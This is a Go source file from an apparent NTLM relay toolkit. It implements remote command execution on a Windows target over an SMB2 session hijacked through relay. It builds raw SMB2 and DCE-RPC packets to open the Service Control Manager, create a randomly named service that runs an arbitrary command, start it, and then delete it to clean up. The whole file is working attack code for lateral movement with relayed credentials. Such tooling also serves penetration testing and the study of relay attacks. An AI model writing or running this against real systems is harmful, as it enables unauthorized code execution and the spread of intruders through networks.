package relay

// postcmd.go — execute a command on a target over an already-authenticated
// SMB2 session (from an NTLM relay) using the Service Control Manager.
//
// After bridgeSMBNTLM completes, the targetConn is an authenticated TCP
// connection in SMB2 session state. We issue SMB2 TREE_CONNECT / CREATE /
// WRITE / READ / CLOSE directly on that connection, then run DCE-RPC SCMR
// operations to create + start + delete a transient service.

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
	"unicode/utf16"

	"github.com/go-impacket/kit/pkg/randname"
)

// RunPostCommand executes cmd on targetConn after a successful NTLM relay.
// targetSessionID is the SMB2 session ID authenticated on the target.
// host is the target hostname/IP (used to build the UNC path).
func RunPostCommand(targetConn net.Conn, targetSessionID uint64, host, cmd string) error {
	c := &rawSMB{
		conn:      targetConn,
		sessionID: targetSessionID,
		msgID:     1000000, // start high to avoid collision with relay message IDs
	}

	unc := fmt.Sprintf(`\\%s\IPC$`, host)
	treeID, err := c.treeConnect(unc)
	if err != nil {
		return fmt.Errorf("TREE_CONNECT IPC$: %w", err)
	}
	defer c.treeDisconnect(treeID)

	fileID, err := c.createFile(treeID, "svcctl")
	if err != nil {
		return fmt.Errorf("CREATE svcctl: %w", err)
	}
	defer c.closeFile(treeID, fileID)

	if err := c.rpcBind(treeID, fileID, uuidSCMR, 2, 0); err != nil {
		return fmt.Errorf("SCMR bind: %w", err)
	}

	scHandle, err := c.openSCManager(treeID, fileID)
	if err != nil {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	defer c.closeServiceHandle(treeID, fileID, scHandle)

	svcName := randname.Alpha(8)
	svcHandle, err := c.createService(treeID, fileID, scHandle, svcName, cmd)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}

	_ = c.startService(treeID, fileID, svcHandle)
	_ = c.deleteService(treeID, fileID, svcHandle)
	_ = c.closeServiceHandle(treeID, fileID, svcHandle)
	return nil
}

// ─── SCMR UUID ────────────────────────────────────────────────────────────────

// SCMR interface: 367ABB81-9844-35F1-AD32-98F038001003
var uuidSCMR = [16]byte{
	0x81, 0xBB, 0x7A, 0x36, 0x44, 0x98, 0xF1, 0x35,
	0xAD, 0x32, 0x98, 0xF0, 0x38, 0x00, 0x10, 0x03,
}

// ─── raw SMB2 client ──────────────────────────────────────────────────────────

type rawSMB struct {
	conn      net.Conn
	sessionID uint64
	msgID     uint64
}

func (c *rawSMB) nextID() uint64 {
	id := c.msgID
	c.msgID++
	return id
}

func (c *rawSMB) send(cmd uint16, treeID uint32, body []byte) error {
	hdr := buildSMB2Hdr(cmd, treeID, c.sessionID, c.nextID())
	return writeSMBPacket(c.conn, append(hdr, body...))
}

func (c *rawSMB) sendRecv(cmd uint16, treeID uint32, body []byte) ([]byte, error) {
	if err := c.send(cmd, treeID, body); err != nil {
		return nil, err
	}
	c.conn.SetReadDeadline(time.Now().Add(15 * time.Second))
	defer c.conn.SetReadDeadline(time.Time{})
	return readSMBPacket(c.conn)
}

// buildSMB2Hdr builds a 64-byte SMB2 header.
func buildSMB2Hdr(cmd uint16, treeID uint32, sessionID, msgID uint64) []byte {
	h := make([]byte, 64)
	copy(h[0:], "\xFESMB")
	binary.LittleEndian.PutUint16(h[4:], 64)     // StructureSize
	binary.LittleEndian.PutUint16(h[6:], 1)      // CreditCharge
	binary.LittleEndian.PutUint16(h[12:], cmd)
	binary.LittleEndian.PutUint16(h[14:], 1)     // CreditRequest
	binary.LittleEndian.PutUint64(h[24:], msgID)
	binary.LittleEndian.PutUint32(h[36:], treeID)
	binary.LittleEndian.PutUint64(h[40:], sessionID)
	return h
}

func smb2StatusCode(pkt []byte) uint32 {
	if len(pkt) < 12 {
		return 0xFFFFFFFF
	}
	return binary.LittleEndian.Uint32(pkt[8:])
}

func smb2TreeID(pkt []byte) uint32 {
	if len(pkt) < 40 {
		return 0
	}
	return binary.LittleEndian.Uint32(pkt[36:])
}

// ─── SMB2 TREE_CONNECT ────────────────────────────────────────────────────────

func (c *rawSMB) treeConnect(unc string) (uint32, error) {
	path16 := encodeUTF16LE(unc)
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(9))               // StructureSize
	binary.Write(&body, binary.LittleEndian, uint16(0))               // Reserved/Flags
	binary.Write(&body, binary.LittleEndian, uint16(64+8))            // PathOffset (hdr+body fixed)
	binary.Write(&body, binary.LittleEndian, uint16(len(path16)))     // PathLength
	body.Write(path16)

	resp, err := c.sendRecv(0x0003, 0, body.Bytes())
	if err != nil {
		return 0, err
	}
	if smb2StatusCode(resp) != 0 {
		return 0, fmt.Errorf("TREE_CONNECT status 0x%08X", smb2StatusCode(resp))
	}
	return smb2TreeID(resp), nil
}

func (c *rawSMB) treeDisconnect(treeID uint32) error {
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(4))  // StructureSize
	binary.Write(&body, binary.LittleEndian, uint16(0))  // Reserved
	_, err := c.sendRecv(0x0004, treeID, body.Bytes())
	return err
}

// ─── SMB2 CREATE ─────────────────────────────────────────────────────────────

type fileID [16]byte

func (c *rawSMB) createFile(treeID uint32, name string) (fileID, error) {
	name16 := encodeUTF16LE(name)
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(57))              // StructureSize
	body.WriteByte(0)                                                  // SecurityFlags
	body.WriteByte(0)                                                  // RequestedOplockLevel (NONE)
	binary.Write(&body, binary.LittleEndian, uint32(2))               // ImpersonationLevel (Impersonation)
	binary.Write(&body, binary.LittleEndian, uint64(0))               // SmbCreateFlags
	binary.Write(&body, binary.LittleEndian, uint64(0))               // Reserved
	binary.Write(&body, binary.LittleEndian, uint32(0x0012019F))      // DesiredAccess (GENERIC_RW + SYNC)
	binary.Write(&body, binary.LittleEndian, uint32(0))               // FileAttributes
	binary.Write(&body, binary.LittleEndian, uint32(3))               // ShareAccess (R+W)
	binary.Write(&body, binary.LittleEndian, uint32(1))               // CreateDisposition (OPEN)
	binary.Write(&body, binary.LittleEndian, uint32(0))               // CreateOptions
	binary.Write(&body, binary.LittleEndian, uint16(64+56))           // NameOffset
	binary.Write(&body, binary.LittleEndian, uint16(len(name16)))     // NameLength
	binary.Write(&body, binary.LittleEndian, uint32(0))               // CreateContextsOffset
	binary.Write(&body, binary.LittleEndian, uint32(0))               // CreateContextsLength
	body.Write(name16)

	resp, err := c.sendRecv(0x0005, treeID, body.Bytes())
	if err != nil {
		return fileID{}, err
	}
	if smb2StatusCode(resp) != 0 {
		return fileID{}, fmt.Errorf("CREATE status 0x%08X", smb2StatusCode(resp))
	}
	// FileId at offset 128 (64 hdr + 64 fixed body fields before FileId)
	if len(resp) < 128+16 {
		return fileID{}, fmt.Errorf("CREATE response too short")
	}
	var fid fileID
	copy(fid[:], resp[128:144])
	return fid, nil
}

func (c *rawSMB) closeFile(treeID uint32, fid fileID) error {
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(24)) // StructureSize
	binary.Write(&body, binary.LittleEndian, uint16(0))  // Flags
	binary.Write(&body, binary.LittleEndian, uint32(0))  // Reserved
	body.Write(fid[:])
	_, err := c.sendRecv(0x0006, treeID, body.Bytes())
	return err
}

// ─── SMB2 WRITE / READ ───────────────────────────────────────────────────────

func (c *rawSMB) writeFile(treeID uint32, fid fileID, data []byte) error {
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(49))             // StructureSize
	binary.Write(&body, binary.LittleEndian, uint16(64+48))          // DataOffset
	binary.Write(&body, binary.LittleEndian, uint32(len(data)))      // Length
	binary.Write(&body, binary.LittleEndian, uint64(0))              // Offset
	body.Write(fid[:])                                                // FileId (16)
	binary.Write(&body, binary.LittleEndian, uint32(0))              // Channel
	binary.Write(&body, binary.LittleEndian, uint32(0))              // RemainingBytes
	binary.Write(&body, binary.LittleEndian, uint16(0))              // WriteChannelInfoOffset
	binary.Write(&body, binary.LittleEndian, uint16(0))              // WriteChannelInfoLength
	binary.Write(&body, binary.LittleEndian, uint32(0))              // Flags
	body.Write(data)

	resp, err := c.sendRecv(0x0009, treeID, body.Bytes())
	if err != nil {
		return err
	}
	if smb2StatusCode(resp) != 0 {
		return fmt.Errorf("WRITE status 0x%08X", smb2StatusCode(resp))
	}
	return nil
}

func (c *rawSMB) readFile(treeID uint32, fid fileID, maxLen uint32) ([]byte, error) {
	var body bytes.Buffer
	binary.Write(&body, binary.LittleEndian, uint16(49))   // StructureSize
	body.WriteByte(0x50)                                    // Padding
	body.WriteByte(0)                                       // Flags
	binary.Write(&body, binary.LittleEndian, maxLen)        // Length
	binary.Write(&body, binary.LittleEndian, uint64(0))    // Offset
	body.Write(fid[:])                                      // FileId (16)
	binary.Write(&body, binary.LittleEndian, uint32(0))    // MinimumCount
	binary.Write(&body, binary.LittleEndian, uint32(0))    // Channel
	binary.Write(&body, binary.LittleEndian, uint32(0))    // RemainingBytes
	binary.Write(&body, binary.LittleEndian, uint16(0))    // ReadChannelInfoOffset
	binary.Write(&body, binary.LittleEndian, uint16(0))    // ReadChannelInfoLength
	body.WriteByte(0)                                       // Buffer (1 byte padding)

	resp, err := c.sendRecv(0x0008, treeID, body.Bytes())
	if err != nil {
		return nil, err
	}
	if smb2StatusCode(resp) != 0 {
		return nil, fmt.Errorf("READ status 0x%08X", smb2StatusCode(resp))
	}
	// DataOffset (1 byte) at body+1, DataLength (4 bytes) at body+2
	if len(resp) < 64+8 {
		return nil, fmt.Errorf("READ response too short")
	}
	dataOff := int(resp[64+1])
	dataLen := int(binary.LittleEndian.Uint32(resp[64+2:]))
	if dataOff+dataLen > len(resp) {
		return nil, fmt.Errorf("READ data out of bounds")
	}
	return resp[dataOff : dataOff+dataLen], nil
}

// ─── DCE-RPC over named pipe ──────────────────────────────────────────────────

func (c *rawSMB) rpcBind(treeID uint32, fid fileID, ifUUID [16]byte, major, minor uint16) error {
	var uuidNDR = [16]byte{
		0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
		0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
	}

	body := new(bytes.Buffer)
	binary.Write(body, binary.LittleEndian, uint16(4280)) // max_xmit_frag
	binary.Write(body, binary.LittleEndian, uint16(4280)) // max_recv_frag
	binary.Write(body, binary.LittleEndian, uint32(0))    // assoc_group_id
	binary.Write(body, binary.LittleEndian, uint16(1))    // n_context_items
	binary.Write(body, binary.LittleEndian, uint16(0))    // reserved
	binary.Write(body, binary.LittleEndian, uint16(0))    // ctxID
	binary.Write(body, binary.LittleEndian, uint16(1))    // n_transfer_syn
	binary.Write(body, binary.LittleEndian, uint16(0))    // reserved
	body.Write(ifUUID[:])
	binary.Write(body, binary.LittleEndian, major)
	binary.Write(body, binary.LittleEndian, minor)
	body.Write(uuidNDR[:])
	binary.Write(body, binary.LittleEndian, uint16(2)) // NDR major
	binary.Write(body, binary.LittleEndian, uint16(0)) // NDR minor

	fragLen := uint16(16 + body.Len())
	hdr := make([]byte, 16)
	hdr[0], hdr[1] = 5, 0           // version
	hdr[2] = 0x0b                   // BIND
	hdr[3] = 0x03                   // first | last
	hdr[4] = 0x10                   // little-endian + ASCII + IEEE
	binary.LittleEndian.PutUint16(hdr[8:], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:], 1) // callID

	pkt := append(hdr, body.Bytes()...)
	if err := c.writeFile(treeID, fid, pkt); err != nil {
		return err
	}

	resp, err := c.readFile(treeID, fid, 4096)
	if err != nil {
		return err
	}
	if len(resp) < 3 || resp[2] != 0x0c { // BIND_ACK
		return fmt.Errorf("SCMR BIND_ACK expected, got 0x%02x", safeIdx(resp, 2))
	}
	return nil
}

func safeIdx(b []byte, i int) byte {
	if i < len(b) {
		return b[i]
	}
	return 0
}

func (c *rawSMB) rpcRequest(treeID uint32, fid fileID, callID uint32, opnum uint16, stub []byte) ([]byte, error) {
	fragLen := uint16(16 + 8 + len(stub))
	hdr := make([]byte, 16)
	hdr[0], hdr[1] = 5, 0
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03 // first | last
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:], callID)

	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:], uint32(len(stub))) // alloc_hint
	binary.LittleEndian.PutUint16(reqHdr[4:], 0)                 // ctxID
	binary.LittleEndian.PutUint16(reqHdr[6:], opnum)

	pkt := append(append(hdr, reqHdr...), stub...)
	if err := c.writeFile(treeID, fid, pkt); err != nil {
		return nil, err
	}
	return c.readFile(treeID, fid, 65535)
}

// ─── SCMR operations ──────────────────────────────────────────────────────────

type scmrHandle [20]byte

// ROpenSCManagerW (opnum 15)
func (c *rawSMB) openSCManager(treeID uint32, fid fileID) (scmrHandle, error) {
	var stub bytes.Buffer
	binary.Write(&stub, binary.LittleEndian, uint32(0))         // lpMachineName = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))         // lpDatabaseName = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0x000F003F)) // SC_MANAGER_ALL_ACCESS

	resp, err := c.rpcRequest(treeID, fid, 2, 15, stub.Bytes())
	if err != nil {
		return scmrHandle{}, err
	}
	return parseHandleResponse(resp)
}

// RCreateServiceW (opnum 12)
func (c *rawSMB) createService(treeID uint32, fid fileID, scHandle scmrHandle, name, binPath string) (scmrHandle, error) {
	var stub bytes.Buffer
	stub.Write(scHandle[:])                                        // hSCManager (20 bytes)
	writeNDRString(&stub, name)                                    // lpServiceName
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpDisplayName = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0x000F01FF))  // dwDesiredAccess
	binary.Write(&stub, binary.LittleEndian, uint32(0x10))        // SERVICE_WIN32_OWN_PROCESS
	binary.Write(&stub, binary.LittleEndian, uint32(0x03))        // SERVICE_DEMAND_START
	binary.Write(&stub, binary.LittleEndian, uint32(0x01))        // SERVICE_ERROR_NORMAL
	writeNDRString(&stub, binPath)                                 // lpBinaryPathName
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpLoadOrderGroup = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpdwTagId = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpDependencies = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // dwDependSize
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpServiceStartName = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // lpPassword = NULL
	binary.Write(&stub, binary.LittleEndian, uint32(0))           // dwPwSize

	resp, err := c.rpcRequest(treeID, fid, 3, 12, stub.Bytes())
	if err != nil {
		return scmrHandle{}, err
	}
	return parseHandleResponse(resp)
}

// RStartServiceW (opnum 19)
func (c *rawSMB) startService(treeID uint32, fid fileID, h scmrHandle) error {
	var stub bytes.Buffer
	stub.Write(h[:])
	binary.Write(&stub, binary.LittleEndian, uint32(0)) // argc
	binary.Write(&stub, binary.LittleEndian, uint32(0)) // argv = NULL
	_, err := c.rpcRequest(treeID, fid, 4, 19, stub.Bytes())
	return err
}

// RDeleteService (opnum 2)
func (c *rawSMB) deleteService(treeID uint32, fid fileID, h scmrHandle) error {
	var stub bytes.Buffer
	stub.Write(h[:])
	_, err := c.rpcRequest(treeID, fid, 5, 2, stub.Bytes())
	return err
}

// RCloseServiceHandle (opnum 0)
func (c *rawSMB) closeServiceHandle(treeID uint32, fid fileID, h scmrHandle) error {
	var stub bytes.Buffer
	stub.Write(h[:])
	_, err := c.rpcRequest(treeID, fid, 6, 0, stub.Bytes())
	return err
}

// parseHandleResponse extracts a 20-byte SCMR context handle from an RPC response.
// All handle-returning SCMR methods return: handle[20] + return_code[4].
func parseHandleResponse(resp []byte) (scmrHandle, error) {
	// Skip DCE-RPC hdr(16) + request hdr(8) = 24 bytes
	const hdrSize = 24
	if len(resp) < hdrSize+20+4 {
		return scmrHandle{}, fmt.Errorf("SCMR response too short (%d bytes)", len(resp))
	}
	// If the response has NDR error code at the end:
	retCode := binary.LittleEndian.Uint32(resp[len(resp)-4:])
	if retCode != 0 {
		return scmrHandle{}, fmt.Errorf("SCMR error code 0x%08X", retCode)
	}
	var h scmrHandle
	// Handle is in the last 20+4 bytes, at offset len-24
	copy(h[:], resp[len(resp)-24:])
	return h, nil
}

// ─── NDR helpers ─────────────────────────────────────────────────────────────

// writeNDRString writes an NDR conformant wide-character string (unique pointer + array).
func writeNDRString(b io.Writer, s string) {
	r16 := utf16.Encode([]rune(s))
	r16 = append(r16, 0) // null terminator
	n := uint32(len(r16))

	binary.Write(b, binary.LittleEndian, uint32(0x00020000)) // referent (non-null)
	binary.Write(b, binary.LittleEndian, n)                  // max_count
	binary.Write(b, binary.LittleEndian, uint32(0))          // offset
	binary.Write(b, binary.LittleEndian, n)                  // actual_count
	for _, w := range r16 {
		binary.Write(b, binary.LittleEndian, w)
	}
	// 4-byte alignment
	byteLen := int(n) * 2
	if pad := (4 - byteLen%4) % 4; pad > 0 {
		if bw, ok := b.(*bytes.Buffer); ok {
			bw.Write(make([]byte, pad))
		}
	}
}

// encodeUTF16LE converts a string to a little-endian UTF-16 byte slice (no null terminator).
func encodeUTF16LE(s string) []byte {
	r16 := utf16.Encode([]rune(s))
	out := make([]byte, len(r16)*2)
	for i, w := range r16 {
		binary.LittleEndian.PutUint16(out[i*2:], w)
	}
	return out
}
